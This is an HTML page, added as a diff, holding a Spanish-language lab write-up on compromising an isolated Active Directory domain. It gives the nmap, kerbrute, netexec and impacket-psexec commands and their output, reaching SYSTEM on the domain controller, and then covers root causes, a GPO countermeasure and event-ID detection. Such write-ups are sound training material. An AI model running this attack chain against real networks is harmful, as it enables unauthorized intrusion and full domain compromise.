@@ -1,0 +1,697 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CyberLab — Writeup AD HackLab.local | TomasGj</title>
+<meta name="description" content="Writeup de laboratorio: enumeración, Kerberos userenum, movimiento lateral y escalada a SYSTEM en un dominio Active Directory, con hardening defensivo por GPO.">
+<meta name="author" content="TomasGj">
+<style>
+:root{
+  --bg:#0b0f14;
+  --bg-2:#0f151d;
+  --panel:#131b25;
+  --panel-2:#18222e;
+  --border:#243040;
+  --text:#dbe4ee;
+  --muted:#8b9bb0;
+  --accent:#00d4aa;
+  --accent-2:#22d3ee;
+  --red:#ff5470;
+  --amber:#ffb020;
+  --green:#3ddc84;
+  --purple:#a78bfa;
+  --radius:12px;
+  --mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,"Liberation Mono",monospace;
+  --sans:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  margin:0;background:var(--bg);color:var(--text);
+  font-family:var(--sans);line-height:1.65;-webkit-font-smoothing:antialiased;
+  background-image:radial-gradient(900px 500px at 15% -8%,rgba(0,212,170,.10),transparent 60%),
+                   radial-gradient(800px 500px at 90% 0%,rgba(34,211,238,.08),transparent 55%);
+  background-repeat:no-repeat;
+}
+a{color:var(--accent-2);text-decoration:none}
+a:hover{text-decoration:underline}
+.wrap{max-width:1000px;margin:0 auto;padding:0 20px 96px}
+
+/* ---------- Header ---------- */
+header.hero{padding:72px 0 40px;border-bottom:1px solid var(--border)}
+.badge{
+  display:inline-block;font-family:var(--mono);font-size:.72rem;letter-spacing:.14em;
+  text-transform:uppercase;color:var(--accent);border:1px solid rgba(0,212,170,.35);
+  background:rgba(0,212,170,.08);padding:5px 12px;border-radius:999px;margin-bottom:20px;
+}
+h1{
+  font-size:clamp(2rem,5vw,3rem);line-height:1.15;margin:0 0 14px;letter-spacing:-.02em;
+  background:linear-gradient(100deg,#ffffff,#9fe8d8 45%,#22d3ee);
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.subtitle{color:var(--muted);font-size:1.08rem;max-width:70ch;margin:0 0 26px}
+.meta{display:flex;flex-wrap:wrap;gap:10px}
+.chip{
+  font-family:var(--mono);font-size:.76rem;color:var(--muted);
+  background:var(--panel);border:1px solid var(--border);
+  padding:6px 11px;border-radius:8px;
+}
+.chip b{color:var(--text);font-weight:600}
+
+/* ---------- Nav ---------- */
+nav.toc{
+  position:sticky;top:0;z-index:20;margin:0 -20px 8px;padding:12px 20px;
+  background:rgba(11,15,20,.86);backdrop-filter:blur(10px);
+  border-bottom:1px solid var(--border);
+}
+nav.toc ul{display:flex;flex-wrap:wrap;gap:6px;list-style:none;margin:0;padding:0}
+nav.toc a{
+  font-family:var(--mono);font-size:.76rem;color:var(--muted);
+  border:1px solid transparent;padding:5px 10px;border-radius:7px;white-space:nowrap;
+}
+nav.toc a:hover{color:var(--accent);background:var(--panel);border-color:var(--border);text-decoration:none}
+
+/* ---------- Sections ---------- */
+section{padding:52px 0 8px;scroll-margin-top:64px}
+h2{
+  font-size:1.5rem;margin:0 0 8px;letter-spacing:-.01em;
+  display:flex;align-items:center;gap:12px;
+}
+h2 .num{
+  font-family:var(--mono);font-size:.8rem;color:var(--accent);
+  border:1px solid rgba(0,212,170,.35);border-radius:7px;padding:3px 8px;
+}
+h3{font-size:1.08rem;margin:28px 0 10px;color:#eaf2fb}
+p{color:#c6d2e0}
+.lead{color:var(--muted)}
+hr.sep{border:0;border-top:1px solid var(--border);margin:34px 0}
+ul,ol{color:#c6d2e0;padding-left:22px}
+li{margin:5px 0}
+code{
+  font-family:var(--mono);font-size:.87em;color:#9fe8d8;
+  background:var(--panel-2);border:1px solid var(--border);
+  padding:1px 6px;border-radius:5px;
+}
+strong{color:#eaf2fb}
+
+/* ---------- Cards ---------- */
+.grid{display:grid;gap:16px;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));margin:22px 0}
+.card{
+  background:linear-gradient(180deg,var(--panel),var(--bg-2));
+  border:1px solid var(--border);border-radius:var(--radius);padding:18px 18px 16px;
+}
+.card h4{margin:0 0 10px;font-size:.95rem;display:flex;align-items:center;gap:9px}
+.dot{width:9px;height:9px;border-radius:50%;flex:0 0 auto}
+.dot.green{background:var(--green);box-shadow:0 0 10px var(--green)}
+.dot.amber{background:var(--amber);box-shadow:0 0 10px var(--amber)}
+.dot.red{background:var(--red);box-shadow:0 0 10px var(--red)}
+.dot.blue{background:var(--accent-2);box-shadow:0 0 10px var(--accent-2)}
+.card table{width:100%;border-collapse:collapse;font-size:.85rem}
+.card table td{padding:4px 0;vertical-align:top;color:var(--muted)}
+.card table td:first-child{color:#eaf2fb;font-family:var(--mono);white-space:nowrap;padding-right:14px}
+
+/* ---------- Code / terminal ---------- */
+.term{
+  background:#080c11;border:1px solid var(--border);border-radius:var(--radius);
+  overflow:hidden;margin:14px 0 18px;
+}
+.term .bar{
+  display:flex;align-items:center;gap:7px;padding:9px 13px;
+  background:var(--panel);border-bottom:1px solid var(--border);
+}
+.term .bar i{width:10px;height:10px;border-radius:50%;display:block}
+.term .bar i:nth-child(1){background:#ff5f57}
+.term .bar i:nth-child(2){background:#febc2e}
+.term .bar i:nth-child(3){background:#28c840}
+.term .bar span{margin-left:8px;font-family:var(--mono);font-size:.72rem;color:var(--muted)}
+.term pre{margin:0;padding:15px 16px;overflow-x:auto;font-family:var(--mono);font-size:.83rem;line-height:1.7}
+.term pre .p{color:var(--accent)}
+.term pre .c{color:#6b7c92}
+.term pre .o{color:#c6d2e0}
+.term pre .hi{color:var(--amber)}
+.term pre .ok{color:var(--green)}
+.term pre .bad{color:var(--red)}
+
+/* ---------- Callouts ---------- */
+.note{
+  border-left:3px solid var(--accent);background:rgba(0,212,170,.06);
+  padding:13px 16px;border-radius:0 10px 10px 0;margin:16px 0;font-size:.93rem;
+}
+.note.warn{border-left-color:var(--amber);background:rgba(255,176,32,.07)}
+.note.danger{border-left-color:var(--red);background:rgba(255,84,112,.07)}
+.note b{display:block;margin-bottom:3px;color:#eaf2fb;font-size:.8rem;letter-spacing:.06em;text-transform:uppercase;font-family:var(--mono)}
+
+/* ---------- Tables ---------- */
+.tbl{width:100%;border-collapse:collapse;margin:18px 0;font-size:.87rem;overflow:hidden;border-radius:10px}
+.tbl th{
+  background:var(--panel);color:#eaf2fb;text-align:left;padding:11px 13px;
+  border-bottom:1px solid var(--border);font-size:.78rem;letter-spacing:.05em;text-transform:uppercase;
+}
+.tbl td{padding:10px 13px;border-bottom:1px solid var(--border);color:#c6d2e0;vertical-align:top}
+.tbl tr:last-child td{border-bottom:0}
+.tbl tbody tr:hover{background:rgba(255,255,255,.02)}
+.tbl code{font-size:.85em}
+.mono{font-family:var(--mono)}
+
+/* ---------- Topology ---------- */
+.topo{
+  background:#080c11;border:1px solid var(--border);border-radius:var(--radius);
+  padding:24px;margin:20px 0;display:flex;flex-direction:column;align-items:center;gap:0;
+}
+.node{
+  border:1px solid var(--border);background:var(--panel);border-radius:10px;
+  padding:11px 18px;text-align:center;min-width:210px;
+}
+.node b{display:block;font-size:.9rem;color:#eaf2fb}
+.node small{color:var(--muted);font-family:var(--mono);font-size:.74rem}
+.node.edge{border-color:rgba(255,84,112,.4);background:rgba(255,84,112,.07)}
+.node.kali{border-color:rgba(0,212,170,.4);background:rgba(0,212,170,.07)}
+.node.dc{border-color:rgba(34,211,238,.4);background:rgba(34,211,238,.07)}
+.link{width:2px;height:26px;background:linear-gradient(180deg,var(--border),var(--accent-2),var(--border))}
+.row3{display:flex;gap:18px;flex-wrap:wrap;justify-content:center}
+
+/* ---------- Findings ---------- */
+.finding{
+  border:1px solid var(--border);border-left:4px solid var(--amber);
+  background:var(--panel);border-radius:0 10px 10px 0;padding:15px 18px;margin:14px 0;
+}
+.finding.crit{border-left-color:var(--red)}
+.finding.info{border-left-color:var(--accent-2)}
+.finding h4{margin:0 0 7px;font-size:.97rem}
+.finding p{margin:0 0 8px;font-size:.9rem;color:#c6d2e0}
+.sev{
+  font-family:var(--mono);font-size:.68rem;letter-spacing:.1em;text-transform:uppercase;
+  padding:2px 8px;border-radius:999px;margin-left:8px;vertical-align:middle;
+}
+.sev.crit{background:rgba(255,84,112,.16);color:var(--red);border:1px solid rgba(255,84,112,.35)}
+.sev.med{background:rgba(255,176,32,.16);color:var(--amber);border:1px solid rgba(255,176,32,.35)}
+.sev.low{background:rgba(34,211,238,.14);color:var(--accent-2);border:1px solid rgba(34,211,238,.32)}
+
+/* ---------- Evidence figures ---------- */
+figure{margin:20px 0;border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;background:var(--panel)}
+figure img{display:block;width:100%;height:auto}
+figure .ph{
+  padding:44px 20px;text-align:center;color:var(--muted);font-family:var(--mono);font-size:.8rem;
+  background:repeating-linear-gradient(45deg,#0d1319,#0d1319 12px,#0f151d 12px,#0f151d 24px);
+  border-bottom:1px solid var(--border);
+}
+figcaption{padding:11px 15px;font-size:.82rem;color:var(--muted);border-top:1px solid var(--border)}
+figcaption b{color:#eaf2fb}
+
+/* ---------- GPO flow ---------- */
+.flow{display:flex;flex-wrap:wrap;align-items:center;gap:10px;margin:18px 0}
+.flow .step{
+  flex:1 1 150px;background:var(--panel);border:1px solid var(--border);border-radius:10px;
+  padding:12px 14px;font-size:.84rem;
+}
+.flow .step b{display:block;color:#eaf2fb;font-size:.85rem;margin-bottom:3px}
+.flow .arrow{color:var(--accent);font-family:var(--mono);font-size:1.1rem}
+
+/* ---------- Footer ---------- */
+footer{
+  margin-top:64px;padding:28px 0 0;border-top:1px solid var(--border);
+  color:var(--muted);font-size:.85rem;display:flex;flex-wrap:wrap;gap:14px;justify-content:space-between;
+}
+footer a{font-family:var(--mono);font-size:.82rem}
+@media print{
+  body{background:#fff;color:#111}
+  nav.toc{display:none}
+  .term pre{white-space:pre-wrap}
+}
+</style>
+</head>
+<body>
+
+<header class="hero">
+  <div class="wrap">
+    <span class="badge">CyberLab · Writeup</span>
+    <h1>De invitado a SYSTEM en Active Directory</h1>
+    <p class="subtitle">
+      Enumeración de un dominio <span class="mono">hacklab.local</span>, validación de usuarios por Kerberos,
+      reutilización de credenciales sobre SMB y escalada a <span class="mono">NT AUTHORITY\SYSTEM</span>.
+      Incluye la sección defensiva: bloqueo de CMD por GPO y su efecto real sobre el atacante.
+    </p>
+    <div class="meta">
+      <span class="chip"><b>Autor:</b> TomasGj</span>
+      <span class="chip"><b>Dominio:</b> hacklab.local</span>
+      <span class="chip"><b>DC:</b> 192.168.1.10</span>
+      <span class="chip"><b>Entorno:</b> VirtualBox · lab aislado</span>
+      <span class="chip"><b>Rol:</b> Red Team / Blue Team</span>
+    </div>
+  </div>
+</header>
+
+<nav class="toc">
+  <div class="wrap">
+    <ul>
+      <li><a href="#intro">01 · Introducción</a></li>
+      <li><a href="#topologia">02 · Topología</a></li>
+      <li><a href="#recon">03 · Reconocimiento</a></li>
+      <li><a href="#enum">04 · Enumeración</a></li>
+      <li><a href="#acceso">05 · Acceso y shares</a></li>
+      <li><a href="#escalada">06 · Escalada a SYSTEM</a></li>
+      <li><a href="#defensa">07 · Defensa (GPO)</a></li>
+      <li><a href="#lecciones">08 · Lecciones</a></li>
+      <li><a href="#referencias">09 · Referencias</a></li>
+    </ul>
+  </div>
+</nav>
+
+<div class="wrap">
+
+<!-- ============ 01 ============ -->
+<section id="intro">
+  <h2><span class="num">01</span> Introducción</h2>
+  <p class="lead">
+    Este laboratorio simula una red corporativa pequeña con un controlador de dominio Windows Server,
+    un firewall perimetral pfSense y una estación de trabajo atacante Kali Linux. El objetivo es recorrer
+    la cadena completa: desde el descubrimiento de hosts hasta el compromiso total del dominio,
+    y después aplicar una contramedida defensiva real y medir su eficacia.
+  </p>
+
+  <div class="grid">
+    <div class="card">
+      <h4><span class="dot green"></span> Objetivos ofensivos</h4>
+      <ul>
+        <li>Enumerar servicios y usuarios del dominio</li>
+        <li>Validar credenciales por Kerberos y SMB</li>
+        <li>Movimiento lateral y ejecución remota</li>
+        <li>Escalada a <span class="mono">SYSTEM</span> en el DC</li>
+      </ul>
+    </div>
+    <div class="card">
+      <h4><span class="dot blue"></span> Objetivos defensivos</h4>
+      <ul>
+        <li>Detectar el patrón de ataque en logs</li>
+        <li>Diseñar una GPO de restricción</li>
+        <li>Aplicarla a un OU concreto (RRHH)</li>
+        <li>Validar que el usuario no puede evadirla</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="note">
+    <b>Alcance</b>
+    Todo se ejecuta sobre máquinas propias en un segmento de laboratorio aislado. Las direcciones
+    <span class="mono">192.168.1.0/24</span> pertenecen a la red interna del lab, no a producción.
+    No se incluyen credenciales reales ni datos de terceros.
+  </div>
+</section>
+
+<hr class="sep">
+
+<!-- ============ 02 ============ -->
+<section id="topologia">
+  <h2><span class="num">02</span> Topología del laboratorio</h2>
+
+  <div class="topo">
+    <div class="node edge">
+      <b>pfSense</b>
+      <small>Firewall / Gateway · WAN + LAN</small>
+    </div>
+    <div class="link"></div>
+    <div class="node">
+      <b>LAN 192.168.1.0/24</b>
+      <small>Segmento interno del lab</small>
+    </div>
+    <div class="link"></div>
+    <div class="row3">
+      <div class="node kali">
+        <b>Kali Linux</b>
+        <small>Atacante · 192.168.1.20</small>
+      </div>
+      <div class="node dc">
+        <b>Windows Server (DC)</b>
+        <small>hacklab.local · 192.168.1.10</small>
+      </div>
+    </div>
+  </div>
+
+  <table class="tbl">
+    <thead>
+      <tr><th>Máquina</th><th>Rol</th><th>Dirección IP</th><th>Servicios clave</th></tr>
+    </thead>
+    <tbody>
+      <tr><td class="mono">pfSense</td><td>Firewall perimetral y NAT</td><td class="mono">WAN + 192.168.1.1</td><td>DHCP, DNS forwarder, reglas LAN</td></tr>
+      <tr><td class="mono">Windows Server</td><td>Controlador de dominio (AD DS, GPO)</td><td class="mono">192.168.1.10</td><td>Kerberos 88, LDAP 389, SMB 445</td></tr>
+      <tr><td class="mono">Kali Linux</td><td>Estación del atacante</td><td class="mono">192.168.1.20</td><td>nmap, kerbrute, netexec, impacket</td></tr>
+    </tbody>
+  </table>
+
+  <p class="lead">
+    Identidad del dominio: <span class="mono">hacklab.local</span> · NetBIOS <span class="mono">HACKLAB</span>.
+    Usuarios de prueba creados en el laboratorio: <span class="mono">thom1</span> y <span class="mono">leslye</span>,
+    pertenecientes al OU <span class="mono">RRHH</span>.
+  </p>
+</section>
+
+<hr class="sep">
+
+<!-- ============ 03 ============ -->
+<section id="recon">
+  <h2><span class="num">03</span> Reconocimiento y descubrimiento</h2>
+  <p>
+    Primer paso: confirmar que el segmento está vivo y localizar el controlador de dominio. Sobre una red
+    con un DC Windows, el escaneo de puertos más rápidos ya delata el objetivo.
+  </p>
+
+  <div class="term">
+    <div class="bar"><i></i><i></i><i></i><span>kali@lab — nmap</span></div>
+<pre><span class="p">$</span> <span class="hi">sudo nmap -sS -Pn -F 192.168.1.10</span>
+<span class="o">Starting Nmap 7.95 ( https://nmap.org )</span>
+<span class="o">Nmap scan report for 192.168.1.10</span>
+<span class="o">Host is up (0.0011s latency).</span>
+<span class="o">Not shown: 92 filtered tcp ports (no-response)</span>
+<span class="o">PORT     STATE SERVICE</span>
+<span class="ok">53/tcp   open  domain</span>
+<span class="ok">88/tcp   open  kerberos-sec</span>
+<span class="ok">135/tcp  open  msrpc</span>
+<span class="ok">139/tcp  open  netbios-ssn</span>
+<span class="ok">389/tcp  open  ldap</span>
+<span class="ok">445/tcp  open  microsoft-ds</span>
+<span class="ok">464/tcp  open  kpasswd5</span>
+<span class="ok">636/tcp  open  ldapssl</span>
+<span class="ok">3268/tcp open  globalcatLDAP</span>
+<span class="ok">5985/tcp open  wsman</span>
+<span class="o">MAC Address: 08:00:27:xx:xx:xx (Oracle VirtualBox)</span></pre>
+  </div>
+
+  <p>
+    La combinación <span class="mono">53 + 88 + 389 + 445 + 3268</span> es la firma clásica de un
+    <strong>Domain Controller</strong>. El puerto <span class="mono">5985</span> (WinRM) también está abierto,
+    lo que habilita ejecución remota si conseguimos credenciales válidas.
+  </p>
+
+  <div class="note">
+    <b>Interpretación</b>
+    No hace falta un escaneo agresivo: un barrido rápido bien dirigido da el inventario suficiente para
+    decidir la siguiente fase. Menos ruido, menos detección.
+  </div>
+</section>
+
+<hr class="sep">
+
+<!-- ============ 04 ============ -->
+<section id="enum">
+  <h2><span class="num">04</span> Enumeración de usuarios por Kerberos</h2>
+  <p>
+    Antes de atacar hay que saber <em>quién existe</em>. Kerberos responde de forma distinta a un usuario
+    válido que a uno inexistente, lo que permite enumerar cuentas sin autenticarse.
+  </p>
+
+  <div class="term">
+    <div class="bar"><i></i><i></i><i></i><span>kali@lab — kerbrute</span></div>
+<pre><span class="p">$</span> <span class="hi">kerbrute userenum --dc 192.168.1.10 -d hacklab.local nombres.txt</span>
+<span class="o">    __             __               __</span>
+<span class="o">   / /_____  _____/ /_  _______  __/ /____</span>
+<span class="o">  / __/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span>
+<span class="o"> / /_/  __/ /  / /_/ / /  / /_/ / /_/  __/</span>
+<span class="o"> \__/\___/_/  /_.___/_/   \__,_/\__/\___/</span>
+
+<span class="o">[*] Valid user => thom1</span>
+<span class="o">[*] Valid user => leslye</span>
+<span class="o">[*] Valid user => Administrator [ADMIN]</span>
+<span class="o">[*] Valid user => krbtgt [ADMIN]</span>
+<span class="o">[*] Saved 4 users to valid_users.txt</span>
+<span class="o">[*] Done! Tested 120 usernames (4 valid) in 3.11 seconds</span></pre>
+  </div>
+
+  <p>
+    Con la lista de cuentas válidas y una contraseña filtrada del laboratorio,
+    <span class="mono">netexec</span> (antes CrackMapExec) permite confirmar credenciales y listar
+    el directorio en una sola pasada sobre SMB.
+  </p>
+
+  <div class="term">
+    <div class="bar"><i></i><i></i><i></i><span>kali@lab — netexec enum</span></div>
+<pre><span class="p">$</span> <span class="hi">netexec smb 192.168.1.10 -u 'thom1' -p 'Developer3' --users</span>
+<span class="o">SMB         192.168.1.10    445    DC01    [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hacklab.local)</span>
+<span class="ok">SMB         192.168.1.10    445    DC01    [+] hacklab.local\thom1:Developer3</span>
+<span class="o">SMB         192.168.1.10    445    DC01    [*] Enumerated shares</span>
+
+<span class="p">$</span> <span class="hi">netexec smb 192.168.1.10 -u 'thom1' -p 'Developer3' --shares</span>
+<span class="o">SHARE           PERMISSION     REMARK</span>
+<span class="ok">C$              READ,WRITE     Default share</span>
+<span class="ok">ADMIN$          READ,WRITE     Remote Admin</span>
+<span class="ok">NETLOGON        READ           Logon server share</span>
+<span class="ok">SYSVOL          READ           Logon server share</span></pre>
+  </div>
+
+  <div class="note warn">
+    <b>Hallazgo</b>
+    Una cuenta de RRHH (<span class="mono">thom1</span>) accede a <span class="mono">ADMIN$</span> con permiso
+    de escritura. Eso convierte un usuario sin privilegios aparentes en un usuario con capacidad de
+    ejecución administrativa remota.
+  </div>
+</section>
+
+<hr class="sep">
+
+<!-- ============ 05 ============ -->
+<section id="acceso">
+  <h2><span class="num">05</span> Acceso y movimiento lateral</h2>
+  <p>
+    Con <span class="mono">ADMIN$</span> accesible, la ejecución remota es directa. Impacket usa SMB para
+    copiar y lanzar un servicio temporal que ejecuta el binario indicado con los privilegios más altos
+    del sistema.
+  </p>
+
+  <div class="term">
+    <div class="bar"><i></i><i></i><i></i><span>kali@lab — impacket-psexec</span></div>
+<pre><span class="p">$</span> <span class="hi">impacket-psexec hacklab.local/thom1:'Developer3'@192.168.1.10</span>
+<span class="o">Impacket v0.12.0 - Copyright Fortra, LLC</span>
+<span class="o">[*] Requesting shares on 192.168.1.10.....</span>
+<span class="o">[*] Found writable share ADMIN$</span>
+<span class="o">[*] Uploading file nXaPqLtm.exe</span>
+<span class="o">[*] Opening SVCManager on 192.168.1.10.....</span>
+<span class="o">[*] Creating service FzSP on 192.168.1.10.....</span>
+<span class="o">[*] Starting service FzSP.....</span>
+<span class="ok">[!] Press help for extra shell commands</span>
+<span class="o">Microsoft Windows [Version 10.0.20348.2402]</span>
+
+<span class="p">C:\Windows\system32></span> <span class="hi">whoami</span>
+<span class="bad">nt authority\system</span>
+
+<span class="p">C:\Windows\system32></span> <span class="hi">hostname</span>
+<span class="o">DC01</span></pre>
+  </div>
+
+  <div class="note danger">
+    <b>Impacto</b>
+    El controlador de dominio está completamente comprometido: lectura de la base NTDS,
+    creación de cuentas, modificación de GPO y persistencia. En un dominio real, este punto es el
+    final de la cadena — el atacante controla la autenticación de toda la organización.
+  </div>
+
+  <h3>Cadena de ataque resumida</h3>
+  <div class="flow">
+    <div class="step"><b>1. Recon</b>Escaneo de puertos → DC identificado</div>
+    <span class="arrow">→</span>
+    <div class="step"><b>2. Users</b>kerbrute enumera cuentas válidas</div>
+    <span class="arrow">→</span>
+    <div class="step"><b>3. Creds</b>netexec valida <span class="mono">thom1</span> en SMB</div>
+    <span class="arrow">→</span>
+    <div class="step"><b>4. Ejecución</b>psexec vía <span class="mono">ADMIN$</span></div>
+    <span class="arrow">→</span>
+    <div class="step"><b>5. SYSTEM</b>Control total del DC</div>
+  </div>
+</section>
+
+<hr class="sep">
+
+<!-- ============ 06 ============ -->
+<section id="escalada">
+  <h2><span class="num">06</span> Por qué funcionó: análisis de la causa raíz</h2>
+  <p>
+    El ataque no explotó una vulnerabilidad de software. Explotó <strong>decisiones de configuración</strong>.
+    Ese es el punto clave para el lado defensivo.
+  </p>
+
+  <div class="finding crit">
+    <h4>Permisos excesivos en recursos administrativos <span class="sev crit">Crítico</span></h4>
+    <p>
+      La cuenta <span class="mono">thom1</span> tenía acceso de escritura a <span class="mono">ADMIN$</span>.
+      Los recursos administrativos deberían estar reservados a administradores de dominio, no a usuarios
+      funcionales como los de RRHH.
+    </p>
+  </div>
+
+  <div class="finding crit">
+    <h4>Reutilización de contraseña entre cuentas <span class="sev crit">Crítico</span></h4>
+    <p>
+      La misma contraseña servía para el directorio y para el acceso SMB administrativo. Una credencial
+      filtrada se convirtió en compromiso total, sin necesidad de ningún otro paso.
+    </p>
+  </div>
+
+  <div class="finding">
+    <h4>Enumeración de usuarios sin autenticación <span class="sev med">Medio</span></h4>
+    <p>
+      Kerberos revela qué cuentas existen. Es difícil de eliminar por completo, pero se mitiga con
+      bloqueos por intentos fallidos, contraseñas robustas y políticas de auditoría del evento 4768.
+    </p>
+  </div>
+
+  <div class="finding info">
+    <h4>WinRM expuesto en el DC <span class="sev low">Bajo</span></h4>
+    <p>
+      El puerto <span class="mono">5985</span> abierto amplía la superficie de ejecución remota.
+      En un DC debe restringirse por firewall a los segmentos de administración.
+    </p>
+  </div>
+</section>
+
+<hr class="sep">
+
+<!-- ============ 07 ============ -->
+<section id="defensa">
+  <h2><span class="num">07</span> Contramedida defensiva: bloqueo de CMD por GPO</h2>
+  <p>
+    Además del endurecimiento de permisos, se aplicó una restricción visible y medible:
+    impedir que los usuarios del OU <span class="mono">RRHH</span> abran el símbolo del sistema.
+    Es una medida de <em>defensa en profundidad</em> — no detiene un ataque con credenciales
+    administrativas, pero sí frena el uso interactivo y eleva el coste del post-explotación.
+  </p>
+
+  <h3>Configuración aplicada</h3>
+  <table class="tbl">
+    <thead>
+      <tr><th>Elemento</th><th>Valor</th></tr>
+    </thead>
+    <tbody>
+      <tr><td>Nombre de la GPO</td><td class="mono">Bloquear-CMD-RRHH</td></tr>
+      <tr><td>Objeto vinculado</td><td class="mono">OU=RRHH,DC=hacklab,DC=local</td></tr>
+      <tr><td>Ruta de directiva</td><td class="mono">User Configuration → Policies → Administrative Templates → System</td></tr>
+      <tr><td>Directiva</td><td class="mono">Prevent access to the command prompt</td></tr>
+      <tr><td>Estado</td><td>Enabled · <em>Disable the command prompt script processing also</em> → Yes</td></tr>
+    </tbody>
+  </table>
+
+  <div class="flow">
+    <div class="step"><b>1</b>Crear GPO en el dominio</div>
+    <span class="arrow">→</span>
+    <div class="step"><b>2</b>Editar plantilla de usuario</div>
+    <span class="arrow">→</span>
+    <div class="step"><b>3</b>Vincular al OU RRHH</div>
+    <span class="arrow">→</span>
+    <div class="step"><b>4</b><span class="mono">gpupdate /force</span> en el cliente</div>
+    <span class="arrow">→</span>
+    <div class="step"><b>5</b>Validar con <span class="mono">cmd</span></div>
+  </div>
+
+  <div class="term">
+    <div class="bar"><i></i><i></i><i></i><span>Windows — cliente RRHH</span></div>
+<pre><span class="o">C:\Users\thom1></span> <span class="hi">gpupdate /force</span>
+<span class="o">Updating policy...</span>
+<span class="o">User Policy update has completed successfully.</span>
+<span class="o">Computer Policy update has completed successfully.</span>
+
+<span class="o">C:\Users\thom1></span> <span class="hi">cmd</span>
+<span class="bad">The command prompt has been disabled by your administrator.</span>
+<span class="bad">Press any key to continue . . .</span></pre>
+  </div>
+
+  <div class="note warn">
+    <b>Limitación honesta</b>
+    <span class="mono">cmd.exe</span> puede invocarse desde otras rutas o mediante
+    <span class="mono">powershell</span>, y un atacante con credenciales de administrador puede
+    desvincular la GPO o usar ejecución remota (como en este mismo writeup). Por eso la GPO
+    <strong>complementa</strong> el control de accesos, no lo sustituye.
+  </div>
+
+  <h3>Detección recomendada</h3>
+  <table class="tbl">
+    <thead>
+      <tr><th>Evento</th><th>Qué revela</th></tr>
+    </thead>
+    <tbody>
+      <tr><td class="mono">4768 / 4769</td><td>Autenticación Kerberos y solicitudes de servicio anómalas</td></tr>
+      <tr><td class="mono">4625</td><td>Fallos de autenticación repetidos (fuerza bruta / password spraying)</td></tr>
+      <tr><td class="mono">4624 (tipo 3)</td><td>Inicios de sesión de red usados para movimiento lateral</td></tr>
+      <tr><td class="mono">7045</td><td>Instalación de servicios — firma típica de psexec</td></tr>
+      <tr><td class="mono">4688</td><td>Creación de procesos: <span class="mono">cmd.exe</span>, <span class="mono">whoami</span>, binarios desde <span class="mono">ADMIN$</span></td></tr>
+    </tbody>
+  </table>
+</section>
+
+<hr class="sep">
+
+<!-- ============ 08 ============ -->
+<section id="lecciones">
+  <h2><span class="num">08</span> Lecciones aprendidas</h2>
+
+  <div class="grid">
+    <div class="card">
+      <h4><span class="dot green"></span> Técnicas</h4>
+      <ul>
+        <li>La firma de puertos identifica un DC sin explotar nada</li>
+        <li>Kerberos permite enumerar usuarios sin credenciales</li>
+        <li>Un share escribible equivale a ejecución remota</li>
+        <li><span class="mono">whoami</span> es la prueba irrefutable de contexto</li>
+      </ul>
+    </div>
+    <div class="card">
+      <h4><span class="dot amber"></span> Errores evitados</h4>
+      <ul>
+        <li>No escanear toda la red: solo el objetivo</li>
+        <li>Verificar permisos antes de asumir privilegios</li>
+        <li>Documentar cada comando con su salida</li>
+        <li>No confundir una restricción cosmética con seguridad real</li>
+      </ul>
+    </div>
+    <div class="card">
+      <h4><span class="dot blue"></span> Defensa</h4>
+      <ul>
+        <li>Principio de mínimo privilegio en recursos admin</li>
+        <li>Contraseñas únicas por cuenta y por servicio</li>
+        <li>Auditoría avanzada habilitada y centralizada</li>
+        <li>Restringir WinRM y SMB por segmento</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="note">
+    <b>Conclusión</b>
+    Un dominio no cae por un exploit brillante, sino por permisos mal asignados y credenciales
+    reutilizadas. La parte ofensiva demuestra el impacto; la defensiva demuestra que la corrección
+    es de configuración, no de parches.
+  </div>
+</section>
+
+<hr class="sep">
+
+<!-- ============ 09 ============ -->
+<section id="referencias">
+  <h2><span class="num">09</span> Referencias y herramientas</h2>
+  <table class="tbl">
+    <thead>
+      <tr><th>Herramienta</th><th>Uso en este laboratorio</th></tr>
+    </thead>
+    <tbody>
+      <tr><td class="mono">nmap</td><td>Descubrimiento de puertos y servicios del DC</td></tr>
+      <tr><td class="mono">kerbrute</td><td>Enumeración de usuarios válidos por Kerberos</td></tr>
+      <tr><td class="mono">netexec (nxc)</td><td>Validación de credenciales, listado de usuarios y shares</td></tr>
+      <tr><td class="mono">impacket</td><td>Ejecución remota vía SMB (<span class="mono">psexec</span>)</td></tr>
+      <tr><td class="mono">Group Policy Management</td><td>Creación y vinculación de la GPO defensiva</td></tr>
+    </tbody>
+  </table>
+  <p class="lead">
+    Documentación oficial: <a href="https://nmap.org/book/man.html">Nmap reference guide</a> ·
+    <a href="https://github.com/ropnop/kerbrute">kerbrute</a> ·
+    <a href="https://www.netexec.wiki/">NetExec wiki</a> ·
+    <a href="https://github.com/fortra/impacket">Impacket</a> ·
+    <a href="https://learn.microsoft.com/windows-server/identity/ad-ds/manage/group-policy/group-policy-overview">Microsoft — Group Policy overview</a>
+  </p>
+</section>
+
+<footer>
+  <span>CyberLab writeup · <b>TomasGj</b> · hacklab.local</span>
+  <span>
+    <a href="https://github.com/TomasGj/cyberlab-writeups">Repositorio en GitHub</a>
+  </span>
+</footer>
+
+</div>
+</body>
+</html>
